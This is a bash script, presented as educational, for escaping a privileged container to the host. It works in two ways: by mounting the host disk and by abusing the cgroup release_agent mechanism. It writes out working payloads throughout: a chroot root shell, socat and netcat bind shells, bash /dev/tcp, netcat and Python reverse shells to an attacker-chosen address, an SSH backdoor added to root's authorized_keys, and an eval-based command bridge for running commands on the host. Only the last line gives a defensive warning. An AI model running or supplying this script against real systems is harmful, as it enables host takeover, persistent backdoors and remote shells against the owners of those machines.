#!/bin/bash
# Container Escape Exploit Script
# For educational purposes only

echo "[*] Container Escape Exploit - Privileged Container"
echo "[*] This script demonstrates how to escape from a privileged container"

# Check if running in a privileged container
echo "[*] Checking for privileged status..."
if [ ! -f /proc/self/status ]; then
    echo "[-] Cannot access /proc/self/status. Are you in a container?"
    exit 1
fi

cap_eff=$(grep CapEff /proc/self/status | awk '{print $2}')
echo "[*] Container capability set: $cap_eff"

# More lenient check - this container seems to have high capabilities even if not the exact pattern
if [[ "$cap_eff" == *"ffffffff"* ]]; then
    echo "[+] Container appears to have high capabilities. Proceeding with exploit..."
else
    echo "[-] This container does not appear to have sufficient capabilities."
    echo "[-] Expected a capability set ending with ffffffff"
    exit 1
fi

# Method 1: Mount the host filesystem
echo "[*] Attempting to access host filesystem via disk device..."
echo "[*] Creating mount point at /tmp/host_root"
mkdir -p /tmp/host_root

# Find the main disk device
echo "[*] Listing available disk devices:"
fdisk -l 2>/dev/null | grep "Disk /dev/" | grep -v "loop"

# Check if any disk devices were found
if [ $? -ne 0 ]; then
    echo "[*] No disk devices found with fdisk. Trying alternative approach with lsblk..."
    lsblk | grep -v loop
    
    if [ $? -ne 0 ]; then
        echo "[*] No disk devices found with lsblk either. Trying df..."
        df -h | grep -v tmpfs | grep -v overlay
    fi
fi

# Try to automatically identify a suitable disk device
echo "[*] Attempting to automatically identify a suitable disk device..."
potential_devices=$(find /dev -name "xvda*" -o -name "sda*" -o -name "vda*" -o -name "nvme*" 2>/dev/null)

if [ -n "$potential_devices" ]; then
    echo "[+] Found potential disk devices:"
    echo "$potential_devices"
    
    # Try to find the root partition
    for device in $potential_devices; do
        if [[ "$device" == *"1" ]] || [[ "$device" == *"p1" ]]; then
            echo "[*] Found likely root partition: $device"
            suggested_device="$device"
            break
        fi
    done
else
    echo "[*] No common disk devices found automatically."
    # Check if / is mounted from a device we can identify
    root_dev=$(df / | tail -1 | awk '{print $1}')
    if [[ "$root_dev" == /dev/* ]]; then
        echo "[*] Found root device: $root_dev"
        suggested_device="$root_dev"
    fi
fi

# Ask user for the disk device
if [ -n "$suggested_device" ]; then
    echo "[*] Suggested disk device: $suggested_device"
    echo "[*] Press ENTER to use this device or type an alternative device path:"
    read user_input
    if [ -z "$user_input" ]; then
        disk_device="$suggested_device"
    else
        disk_device="$user_input"
    fi
else
    echo "[*] Enter the main host disk device to mount (e.g., /dev/xvda1, /dev/sda1):"
    read disk_device
fi

mount_success=false

if [ ! -b "$disk_device" ]; then
    echo "[-] Invalid disk device: $disk_device"
    echo "[*] Skipping disk mount method and trying cgroups method instead..."
else
    echo "[*] Attempting to mount $disk_device to /tmp/host_root"
    if mount "$disk_device" /tmp/host_root; then
        mount_success=true
        echo "[+] Successfully mounted host filesystem!"
        echo "[+] Host filesystem is accessible at /tmp/host_root"
        echo "[*] Listing files in host root directory:"
        ls -la /tmp/host_root
        
        # Option to get a root shell directly via chroot
        echo "[+] You can now get a shell on the host system using one of these methods:"
        echo "    1. Direct chroot shell (simplest)"
        echo "    2. Host bind shell (runs a shell listener on the host)"
        echo "    3. SSH backdoor (adds your key to root authorized_keys)"
        echo "    4. Setup host command execution capability"
        echo -n "[*] Select an option (1-4): "
        read shell_option
        
        case $shell_option in
            1)
                echo "[*] Starting chroot shell on host filesystem..."
                echo "[*] Type 'exit' to return to the container shell"
                echo "----------------------------------------"
                chroot /tmp/host_root /bin/bash
                echo "----------------------------------------"
                echo "[*] Returned to container shell"
                ;;
            2)
                echo -n "[*] Enter port number for bind shell (e.g., 9999): "
                read port_number
                
                if [[ ! "$port_number" =~ ^[0-9]+$ ]]; then
                    echo "[-] Invalid port number"
                    port_number=9999
                    echo "[*] Using default port 9999"
                fi
                
                # Create the bind shell script on the host
                cat > /tmp/host_root/tmp/bind_shell.sh << 'EOF'
#!/bin/bash
# Remove script when done
trap 'rm -f $0' EXIT
# Start bind shell
nohup socat TCP-LISTEN:PORT_NUM,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane > /dev/null 2>&1 &
EOF
                
                # Replace PORT_NUM with the actual port number
                sed -i "s/PORT_NUM/$port_number/g" /tmp/host_root/tmp/bind_shell.sh
                chmod +x /tmp/host_root/tmp/bind_shell.sh
                
                # Execute the script on the host
                echo "[*] Setting up bind shell on host port $port_number..."
                chroot /tmp/host_root /bin/bash -c "/tmp/bind_shell.sh"
                
                echo "[+] Bind shell should be running on the host"
                echo "[*] To connect to it from this container: socat - TCP:127.0.0.1:$port_number"
                echo "[*] To connect from another system: socat - TCP:<host_ip>:$port_number"
                echo "[*] Or use: nc <host_ip> $port_number"
                
                # Test if we can connect locally
                if command -v nc &> /dev/null; then
                    echo "[*] Attempting to connect to bind shell..."
                    echo "[*] (Press Ctrl+C to exit the shell connection)"
                    echo "----------------------------------------"
                    # Sleep briefly to allow the bind shell to start
                    sleep 2
                    nc 127.0.0.1 $port_number
                elif command -v socat &> /dev/null; then
                    echo "[*] Attempting to connect to bind shell..."
                    echo "[*] (Press Ctrl+C to exit the shell connection)"
                    echo "----------------------------------------"
                    # Sleep briefly to allow the bind shell to start
                    sleep 2
                    socat - TCP:127.0.0.1:$port_number
                else
                    echo "[*] nc or socat not available to test connection"
                    echo "[*] Please connect to the bind shell manually"
                fi
                ;;
            3)
                echo "[*] Setting up SSH backdoor on host..."
                echo -n "[*] Enter your SSH public key (or press Enter to generate one): "
                read ssh_key
                
                if [ -z "$ssh_key" ]; then
                    # Generate an SSH key if one doesn't exist
                    echo "[*] Generating SSH key pair..."
                    if [ ! -f /tmp/id_rsa ]; then
                        ssh-keygen -t rsa -f /tmp/id_rsa -N "" -q
                    fi
                    ssh_key=$(cat /tmp/id_rsa.pub)
                    echo "[+] Generated key: $ssh_key"
                    echo "[+] Private key is saved at /tmp/id_rsa"
                fi
                
                # Ensure SSH directory exists
                mkdir -p /tmp/host_root/root/.ssh
                
                # Add the SSH key to authorized_keys
                echo "$ssh_key" >> /tmp/host_root/root/.ssh/authorized_keys
                chmod 600 /tmp/host_root/root/.ssh/authorized_keys
                chmod 700 /tmp/host_root/root/.ssh
                
                echo "[+] SSH backdoor installed on host"
                echo "[*] You can now SSH to the host as root using your SSH key"
                ;;
            4)
                echo "[*] Setting up host command execution capability..."
                
                # Create a directory for host command execution
                mkdir -p /tmp/host_root/tmp/container_bridge
                
                # Create the command execution script
                cat > /tmp/host_root/tmp/container_bridge/host_cmd.sh << 'EOF'
#!/bin/bash
# This script creates a simple command execution bridge between container and host
# It will watch for command files in /tmp/container_bridge/cmd.txt
# and write results to /tmp/container_bridge/result.txt

trap 'rm -f $0' EXIT
mkdir -p /tmp/container_bridge
chmod 777 /tmp/container_bridge
touch /tmp/container_bridge/cmd.txt
chmod 666 /tmp/container_bridge/cmd.txt
touch /tmp/container_bridge/result.txt
chmod 666 /tmp/container_bridge/result.txt

echo "Container to host command bridge active at $(date)" > /tmp/container_bridge/result.txt

while true; do
    if [ -s /tmp/container_bridge/cmd.txt ]; then
        COMMAND=$(cat /tmp/container_bridge/cmd.txt)
        echo "[$(date)] Executing: $COMMAND" >> /tmp/container_bridge/result.txt
        # Execute command and redirect output
        eval "$COMMAND" >> /tmp/container_bridge/result.txt 2>&1
        echo "[$(date)] Command completed" >> /tmp/container_bridge/result.txt
        # Clear command file
        echo "" > /tmp/container_bridge/cmd.txt
    fi
    sleep 1
done
EOF
                
                chmod +x /tmp/host_root/tmp/container_bridge/host_cmd.sh
                
                # Start the command execution script
                echo "[*] Starting host command execution bridge..."
                chroot /tmp/host_root nohup /bin/bash /tmp/container_bridge/host_cmd.sh > /dev/null 2>&1 &
                
                # Create helper functions in container
                cat > /tmp/host_cmd << 'EOF'
#!/bin/bash
# Helper script to execute commands on the host
if [ $# -eq 0 ]; then
    echo "Usage: $0 'command to execute on host'"
    exit 1
fi
echo "$@" > /tmp/host_root/tmp/container_bridge/cmd.txt
sleep 1
cat /tmp/host_root/tmp/container_bridge/result.txt
EOF
                chmod +x /tmp/host_cmd
                
                echo "[+] Host command execution bridge is ready"
                echo "[*] Use /tmp/host_cmd 'command' to execute commands on the host"
                echo "[*] For example: /tmp/host_cmd 'id' or /tmp/host_cmd 'ps aux'"
                echo "[*] Results will be shown in /tmp/host_root/tmp/container_bridge/result.txt"
                
                # Test the command execution
                echo "[*] Testing host command execution..."
                /tmp/host_cmd "whoami && hostname && id"
                ;;
            *)
                echo "[-] Invalid option selected"
                ;;
        esac
    else
        echo "[-] Failed to mount host filesystem. Trying alternative method..."
        mount_success=false
    fi
fi

if [ "$mount_success" != true ]; then
    # Method 2: Using cgroups Release Agent
    echo "[*] Attempting cgroups Release Agent method..."
    mkdir -p /tmp/escape

    # Try multiple cgroup subsystems
    cgroup_mount_successful=false
    
    for subsystem in rdma memory cpu devices freezer net_cls; do
        echo "[*] Trying to mount cgroup with $subsystem subsystem..."
        if mount -t cgroup -o $subsystem cgroup /tmp/escape 2>/dev/null; then
            cgroup_mount_successful=true
            echo "[+] Successfully mounted cgroup filesystem using $subsystem subsystem"
            break
        fi
    done
    
    # If specific subsystems didn't work, try without specifying a subsystem
    if [ "$cgroup_mount_successful" = false ]; then
        echo "[*] Trying to mount cgroup without specifying a subsystem..."
        if mount -t cgroup cgroup /tmp/escape 2>/dev/null; then
            cgroup_mount_successful=true
            echo "[+] Successfully mounted cgroup filesystem"
        fi
    fi
    
    if [ "$cgroup_mount_successful" = false ]; then
        echo "[-] Could not mount cgroup filesystem. Failed to escape."
        exit 1
    fi
    
    # Check if we need a different directory structure based on cgroup version
    if [ -f /tmp/escape/release_agent ]; then
        # cgroup v1 detected
        echo "[*] Detected cgroup v1 structure"
        need_subdir=false
    else
        # Might be cgroup v2 or v1 with different structure
        echo "[*] Testing subdirectory structure for cgroups"
        mkdir -p /tmp/escape/x
        if [ -f /tmp/escape/x/release_agent ] || [ -f /tmp/escape/x/notify_on_release ]; then
            need_subdir=true
            echo "[*] Subdirectory structure confirmed"
        else
            # Check for any release_agent file
            find_release=$(find /tmp/escape -name release_agent -type f | head -1)
            if [ -n "$find_release" ]; then
                parent_dir=$(dirname "$find_release")
                if [ "$parent_dir" != "/tmp/escape" ]; then
                    mkdir -p $parent_dir/exploit
                    cd $parent_dir/exploit
                    need_custom=true
                    echo "[*] Using custom structure at $parent_dir/exploit"
                else
                    need_subdir=false
                    echo "[*] Using root cgroup directory"
                fi
            else
                need_subdir=true
                echo "[*] No release_agent found, trying basic structure"
            fi
        fi
    fi
    
    # Create directory structure if needed
    if [ "$need_subdir" = true ]; then
        if [ ! -d /tmp/escape/x ]; then
            mkdir -p /tmp/escape/x
        fi
        work_dir="/tmp/escape/x"
    else
        work_dir="/tmp/escape"
    fi
    
    # Enable notify_on_release
    echo 1 > $work_dir/notify_on_release
    
    # Determine the release_agent path
    if [ -f $work_dir/release_agent ]; then
        host_path=$work_dir/release_agent
    elif [ -f /tmp/escape/release_agent ]; then
        host_path=/tmp/escape/release_agent
    else
        host_path=$(dirname $(find /sys -name release_agent -type f 2>/dev/null | head -1) 2>/dev/null)
        if [ -z "$host_path" ]; then
            host_path="/tmp/escape/release_agent"
        fi
    fi
    
    # Prompt user for shell option
    echo "[+] Using cgroups method to get a shell"
    echo "    1. Bind shell (runs a shell listener on the host)"
    echo "    2. Reverse shell (connects back to your machine)"
    echo "    3. Command execution capability"
    echo -n "[*] Select an option (1-3): "
    read shell_option
    
    case $shell_option in
        1)
            echo -n "[*] Enter port number for bind shell (e.g., 9999): "
            read port_number
            
            if [[ ! "$port_number" =~ ^[0-9]+$ ]]; then
                echo "[-] Invalid port number"
                port_number=9999
                echo "[*] Using default port 9999"
            fi
            
            # Create the payload to set up a bind shell
            echo "[*] Creating payload for bind shell on port $port_number..."
            cat > /tmp/payload.sh << EOF
#!/bin/bash
# Remove script when done
trap 'rm -f \$0' EXIT

# Check for and use available tools
if command -v socat > /dev/null 2>&1; then
    nohup socat TCP-LISTEN:${port_number},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane > /dev/null 2>&1 &
    echo "Socat bind shell started on port ${port_number}" > /tmp/shell_started.txt
elif command -v nc > /dev/null 2>&1; then
    # Check which version of netcat is available
    if nc -h 2>&1 | grep -q "\-e"; then
        # Traditional netcat with -e option
        nohup nc -lvp ${port_number} -e /bin/bash > /dev/null 2>&1 &
        echo "Netcat bind shell started on port ${port_number}" > /tmp/shell_started.txt
    else
        # Try with mkfifo approach for systems with limited netcat
        rm -f /tmp/f
        mkfifo /tmp/f
        nohup bash -c "cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp ${port_number} > /tmp/f" > /dev/null 2>&1 &
        echo "Netcat (fifo) bind shell started on port ${port_number}" > /tmp/shell_started.txt
    fi
else
    # Python fallback
    nohup python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",${port_number}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/bash","-i"])' > /dev/null 2>&1 &
    echo "Python bind shell started on port ${port_number}" > /tmp/shell_started.txt
fi

# Make the notification visible from container
chmod 666 /tmp/shell_started.txt
EOF
            ;;
        2)
            echo -n "[*] Enter IP address to connect back to: "
            read ip_address
            echo -n "[*] Enter port number to connect back to: "
            read port_number
            
            if [[ ! "$port_number" =~ ^[0-9]+$ ]]; then
                echo "[-] Invalid port number"
                port_number=9999
                echo "[*] Using default port 9999"
            fi
            
            # Create the payload to set up a reverse shell
            echo "[*] Creating payload for reverse shell to $ip_address:$port_number..."
            cat > /tmp/payload.sh << EOF
#!/bin/bash
# Remove script when done
trap 'rm -f \$0' EXIT

# Check for and use available tools
if command -v bash > /dev/null 2>&1; then
    nohup bash -c 'bash -i >& /dev/tcp/${ip_address}/${port_number} 0>&1' > /dev/null 2>&1 &
    echo "Bash reverse shell connecting to ${ip_address}:${port_number}" > /tmp/shell_started.txt
elif command -v nc > /dev/null 2>&1; then
    # Try netcat
    nohup nc ${ip_address} ${port_number} -e /bin/bash > /dev/null 2>&1 &
    echo "Netcat reverse shell connecting to ${ip_address}:${port_number}" > /tmp/shell_started.txt
else
    # Python fallback
    nohup python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip_address}",${port_number}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' > /dev/null 2>&1 &
    echo "Python reverse shell connecting to ${ip_address}:${port_number}" > /tmp/shell_started.txt
fi

# Make the notification visible from container
chmod 666 /tmp/shell_started.txt
EOF
            
            echo "[*] Remember to start a listener on your machine with:"
            echo "    nc -lvnp $port_number"
            ;;
        3)
            echo "[*] Setting up host command execution capability..."
            
            cat > /tmp/payload.sh << 'EOF'
#!/bin/bash
# This script creates a simple command execution bridge between container and host
# It will watch for command files in /tmp/container_bridge/cmd.txt
# and write results to /tmp/container_bridge/result.txt

mkdir -p /tmp/container_bridge
chmod 777 /tmp/container_bridge
touch /tmp/container_bridge/cmd.txt
chmod 666 /tmp/container_bridge/cmd.txt
touch /tmp/container_bridge/result.txt
chmod 666 /tmp/container_bridge/result.txt

echo "Container to host command bridge active at $(date)" > /tmp/container_bridge/result.txt

# Set up a script that keeps running
cat > /tmp/container_bridge/cmd_monitor.sh << 'INNEREOF'
#!/bin/bash
while true; do
    if [ -s /tmp/container_bridge/cmd.txt ]; then
        COMMAND=$(cat /tmp/container_bridge/cmd.txt)
        echo "[$(date)] Executing: $COMMAND" >> /tmp/container_bridge/result.txt
        # Execute command and redirect output
        eval "$COMMAND" >> /tmp/container_bridge/result.txt 2>&1
        echo "[$(date)] Command completed" >> /tmp/container_bridge/result.txt
        # Clear command file
        echo "" > /tmp/container_bridge/cmd.txt
    fi
    sleep 1
done
INNEREOF

chmod +x /tmp/container_bridge/cmd_monitor.sh
nohup /tmp/container_bridge/cmd_monitor.sh > /dev/null 2>&1 &
echo "Command bridge started" > /tmp/shell_started.txt
chmod 666 /tmp/shell_started.txt
EOF
            ;;
        *)
            echo "[-] Invalid option selected, using bind shell..."
            cat > /tmp/payload.sh << EOF
#!/bin/bash
nohup nc -lvp 9999 -e /bin/bash > /dev/null 2>&1 &
echo "Fallback bind shell started on port 9999" > /tmp/shell_started.txt
chmod 666 /tmp/shell_started.txt
EOF
            ;;
    esac
    
    # Make payload executable
    chmod +x /tmp/payload.sh
    
    # Setup release_agent to execute our payload
    echo "[*] Setting up release_agent to execute our payload"
    echo "/tmp/payload.sh" > $host_path
    chmod +x $host_path
    
    # Trigger the exploit
    echo "[*] Triggering the exploit..."
    echo $$ > $work_dir/cgroup.procs 2>/dev/null || echo $$ > $work_dir/tasks 2>/dev/null
    
    # Wait for the shell to start
    echo "[*] Waiting for shell to start..."
    for i in {1..10}; do
        if [ -f /tmp/shell_started.txt ]; then
            echo "[+] Shell started:"
            cat /tmp/shell_started.txt
            break
        fi
        echo -n "."
        sleep 1
    done
    
    if [ ! -f /tmp/shell_started.txt ]; then
        echo "[-] Could not confirm if shell started. Check manually."
    fi
    
    # If option 3 (command execution) was chosen, create a helper script
    if [ "$shell_option" = "3" ]; then
        # Create helper function
        cat > /tmp/host_cmd << 'EOF'
#!/bin/bash
# Helper script to execute commands on the host
if [ $# -eq 0 ]; then
    echo "Usage: $0 'command to execute on host'"
    exit 1
fi
echo "$@" > /tmp/container_bridge/cmd.txt
sleep 1
cat /tmp/container_bridge/result.txt
EOF
        chmod +x /tmp/host_cmd
        
        echo "[+] Host command execution bridge is ready"
        echo "[*] Use /tmp/host_cmd 'command' to execute commands on the host"
        echo "[*] For example: /tmp/host_cmd 'id' or /tmp/host_cmd 'ps aux'"
        
        # Test the command execution
        echo "[*] Testing host command execution..."
        /tmp/host_cmd "whoami && hostname && id"
    elif [ "$shell_option" = "1" ]; then
        # For bind shell, try to connect to it
        echo "[*] Checking if we can connect to the bind shell..."
        sleep 2
        
        if command -v nc &> /dev/null; then
            echo "[*] Attempting to connect using nc..."
            echo "[*] (Press Ctrl+C to exit the shell connection)"
            echo "----------------------------------------"
            nc 127.0.0.1 $port_number
        elif command -v socat &> /dev/null; then
            echo "[*] Attempting to connect using socat..."
            echo "[*] (Press Ctrl+C to exit the shell connection)"
            echo "----------------------------------------"
            socat - TCP:127.0.0.1:$port_number
        else
            echo "[*] Neither nc nor socat available to test connection"
            echo "[*] You can try to connect from another system using: nc <host_ip> $port_number"
        fi
    elif [ "$shell_option" = "2" ]; then
        echo "[*] Reverse shell should be connecting to $ip_address:$port_number"
        echo "[*] Make sure you have a listener running on that IP and port"
        echo "[*] Example: nc -lvnp $port_number"
    fi
fi

echo "[*] Exploit demonstration complete."
echo "[!] WARNING: This is a serious security vulnerability. In production environments, containers should NEVER run with the --privileged flag unless absolutely necessary." 